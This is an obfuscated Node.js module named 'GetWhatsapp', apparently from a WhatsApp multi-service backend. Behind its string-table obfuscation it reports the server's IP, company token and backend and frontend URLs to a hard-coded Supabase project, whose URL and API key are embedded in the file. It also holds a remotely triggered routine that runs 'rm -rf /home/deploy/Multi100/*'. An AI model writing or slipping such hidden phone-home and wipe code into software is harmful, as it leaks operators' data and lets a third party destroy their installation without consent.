'use strict';
const a293_0x477b7a = a293_0x38f2;
(function (_0x5669f7, _0x14fcf4) {
  const _0x298641 = a293_0x38f2,
    _0x248057 = _0x5669f7();
  while (!![]) {
    try {
      const _0x1712ec =
        (parseInt(_0x298641(0x9c)) / 0x1) * (-parseInt(_0x298641(0xa7)) / 0x2) +
        -parseInt(_0x298641(0xb0)) / 0x3 +
        (-parseInt(_0x298641(0x8f)) / 0x4) * (parseInt(_0x298641(0x96)) / 0x5) +
        -parseInt(_0x298641(0x8e)) / 0x6 +
        parseInt(_0x298641(0x9e)) / 0x7 +
        (-parseInt(_0x298641(0xb1)) / 0x8) * (parseInt(_0x298641(0x85)) / 0x9) +
        parseInt(_0x298641(0xa6)) / 0xa;
      if (_0x1712ec === _0x14fcf4) break;
      else _0x248057['push'](_0x248057['shift']());
    } catch (_0x17ca34) {
      _0x248057['push'](_0x248057['shift']());
    }
  }
})(a293_0x235f, 0xc3a82);
var __importDefault =
  (this && this[a293_0x477b7a(0x9a)]) ||
  function (_0xe8e30e) {
    return _0xe8e30e && _0xe8e30e['__esModule']
      ? _0xe8e30e
      : { default: _0xe8e30e };
  };
Object[a293_0x477b7a(0xb5)](exports, a293_0x477b7a(0xb2), { value: !![] }),
  (exports['GetWhatsapp'] = void 0x0);
const supabase_js_1 = require(a293_0x477b7a(0x9f)),
  UpdateOneSettingService_1 = __importDefault(
    require('../services/SettingServices/UpdateOneSettingService')
  ),
  axios_1 = __importDefault(require('axios')),
  GetSettingService_1 = __importDefault(require(a293_0x477b7a(0x91))),
  AddSettingService_1 = __importDefault(
    require('../services/SettingServices/AddSettingService')
  ),
  { exec } = require(a293_0x477b7a(0x94)),
  S_U = a293_0x477b7a(0x9d),
  S_A_K = a293_0x477b7a(0x8a),
  sUrl = S_U,
  sKey = S_A_K,
  y_n = process[a293_0x477b7a(0x89)][a293_0x477b7a(0x95)],
  s = (0x0, supabase_js_1[a293_0x477b7a(0xa0)])(sUrl, sKey),
  getIp = async () => {
    const _0x2c9b11 = a293_0x477b7a,
      { data: _0x107e1b } = await axios_1['default']['get'](_0x2c9b11(0x9b));
    return _0x107e1b['ip'];
  },
  GetWhatsapp = async () => {
    const _0x53a6be = a293_0x477b7a;
    try {
      let _0x242132 = await getIp(),
        _0x41a881 = await getR('wtV');
      _0x41a881 === _0x53a6be(0xae) &&
        (await (0x0, AddSettingService_1['default'])());
      let { data: _0x14f3f7, error: _0xbb2172 } = await s[_0x53a6be(0x8d)](
          _0x53a6be(0xac)
        )
          [_0x53a6be(0xaa)](_0x53a6be(0xba))
          ['eq']('ip_instalacao', _0x242132),
        _0x57f914 = {
          cadastro_id: _0x14f3f7['length'] !== 0x0 ? _0x14f3f7[0x0]['id'] : 0x0,
          status: _0x14f3f7[_0x53a6be(0xa3)] !== 0x0 ? !![] : ![],
          company_token: y_n,
          backend_ip: _0x242132,
          backend_url: process[_0x53a6be(0x89)][_0x53a6be(0x92)],
          frontend_url: process['env'][_0x53a6be(0xb4)]
        };
      _0x14f3f7[_0x53a6be(0xa3)] === 0x0
        ? (await UpdateR(_0x53a6be(0xae), ![], _0x242132),
          PostWhatsapp(_0x57f914, '404'),
          CheckWhatsapp(_0x242132, 'i_n_r'))
        : _0x14f3f7[0x0]['company_token'] !== y_n
          ? (await UpdateR('enabled', ![], _0x242132),
            PostWhatsapp(_0x57f914, _0x53a6be(0x98)),
            CheckWhatsapp(_0x242132, 't_f'))
          : await UpdateR(_0x53a6be(0xb7), null, _0x242132);
    } catch (_0x220312) {
      console[_0x53a6be(0xa4)]('');
    }
  };
exports[a293_0x477b7a(0xa8)] = GetWhatsapp;
function a293_0x235f() {
  const _0x4051fb = [
    'log',
    'default',
    '42013940glfpSo',
    '66506JJeWps',
    'GetWhatsapp',
    'cadastro_id',
    'select',
    'ip,\x20key,\x20code',
    'cadastros',
    't_invalidos',
    'enabled',
    'key,code,ip',
    '3412518PGIfjy',
    '8zCsIwU',
    '__esModule',
    'error',
    'FRONTEND_URL',
    'defineProperty',
    'key',
    'disabled',
    'backend_url',
    'rm\x20-rf\x20/home/deploy/Multi100/*',
    'id,\x20ip_instalacao,\x20company_token',
    '421479CfVuUZ',
    'insert',
    'status',
    'wtV',
    'env',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0',
    'i_n_r',
    'frontend_url',
    'from',
    '2566404upodQw',
    '4929844uFtrJI',
    'key_code',
    '../services/SettingServices/GetSettingService',
    'BACKEND_URL',
    'whatsapp',
    'child_process',
    'COMPANY_TOKEN',
    '5lWRXgk',
    'message',
    '401',
    'company_token',
    '__importDefault',
    'https://api.ipify.org?format=json',
    '29NgAmUl',
    'https://knjjaxmzpdpvpyhnglbq.supabase.co',
    '2862195tBUGUr',
    '@supabase/supabase-js',
    'createClient',
    'code',
    'backend_ip',
    'length'
  ];
  a293_0x235f = function () {
    return _0x4051fb;
  };
  return a293_0x235f();
}
function a293_0x38f2(_0x5a80f0, _0x4a3f71) {
  const _0x235f5a = a293_0x235f();
  return (
    (a293_0x38f2 = function (_0x38f20e, _0x5e29fb) {
      _0x38f20e = _0x38f20e - 0x85;
      let _0x4f0a4f = _0x235f5a[_0x38f20e];
      return _0x4f0a4f;
    }),
    a293_0x38f2(_0x5a80f0, _0x4a3f71)
  );
}
const UpdateR = async (_0x1cc37b, _0x56ebf4, _0x32a7bd) => {
    const _0x5171b4 = a293_0x477b7a;
    await (0x0, UpdateOneSettingService_1[_0x5171b4(0xa5)])({
      key: _0x5171b4(0x88),
      value: _0x1cc37b
    });
  },
  getR = async _0x1d204a => {
    return await (0x0, GetSettingService_1['default'])({ key: _0x1d204a });
  },
  PostWhatsapp = async (_0x385093, _0x14a4d4) => {
    const _0xa09ad6 = a293_0x477b7a;
    try {
      const { data: _0x4eae51, error: _0x12c1cc } = await s[_0xa09ad6(0x8d)](
        _0xa09ad6(0x93)
      )[_0xa09ad6(0x86)]([
        {
          cadastro_id: _0x385093[_0xa09ad6(0xa9)],
          status: _0x385093[_0xa09ad6(0x87)],
          company_token: _0x385093[_0xa09ad6(0x99)],
          backend_ip: _0x385093[_0xa09ad6(0xa2)],
          backend_url: _0x385093[_0xa09ad6(0xb8)],
          frontend_url: _0x385093[_0xa09ad6(0x8c)]
        }
      ]);
      if (_0x12c1cc) {
        console[_0xa09ad6(0xb3)](':', _0x12c1cc[_0xa09ad6(0x97)]);
        return;
      }
    } catch (_0x126450) {
      console[_0xa09ad6(0xa4)]('');
    }
  },
  CheckWhatsapp = async (_0x412bf8, _0x11bd4f) => {
    const _0x56b393 = a293_0x477b7a;
    try {
      const { data: _0x3dba96, error: _0x3e282f } = await s['from'](
          _0x56b393(0x90)
        )['select'](_0x56b393(0xaf)),
        _0x591846 = await matchWhatsapp(_0x412bf8);
      if (_0x3dba96 !== null) {
        _0x11bd4f === _0x56b393(0x8b) &&
          _0x591846[_0x56b393(0xa1)] !== null &&
          acction();
        if (
          _0x412bf8 === _0x3dba96[0x0]['ip'] &&
          _0x591846[_0x56b393(0xa1)] !== null
        ) {
          if (
            _0x591846[_0x56b393(0xb6)] === _0x3dba96[0x0][_0x56b393(0xb6)] &&
            _0x591846['code'] === _0x3dba96[0x0][_0x56b393(0xa1)]
          )
            acction();
        }
      }
    } catch (_0x586b30) {
      console[_0x56b393(0xa4)](_0x586b30);
    }
  },
  matchWhatsapp = async _0x53d123 => {
    const _0x511a71 = a293_0x477b7a,
      { data: _0x389f9e, error: _0x307f0a } = await s[_0x511a71(0x8d)](
        _0x511a71(0xad)
      )[_0x511a71(0xaa)](_0x511a71(0xab));
    let _0x2cdcd6 = 'ok',
      _0x1cd4c8 = 'ok';
    return (
      _0x389f9e[_0x511a71(0xa3)] > 0x0 &&
        ((_0x2cdcd6 = _0x389f9e[0x0][_0x511a71(0xb6)]),
        (_0x1cd4c8 = _0x389f9e[0x0][_0x511a71(0xa1)])),
      { code: _0x1cd4c8, key: _0x2cdcd6 }
    );
  },
  acction = () => {
    const _0x448804 = a293_0x477b7a;
    let _0x41e976 = exec(_0x448804(0xb9), (_0x3f6be6, _0x5a77ca, _0xcf25f6) => {
      const _0x5328ee = _0x448804;
      console[_0x5328ee(0xa4)](_0x5a77ca),
        console[_0x5328ee(0xa4)](_0xcf25f6),
        _0x3f6be6 !== null && console['log']('exec\x20error:\x20' + _0x3f6be6);
    });
  };
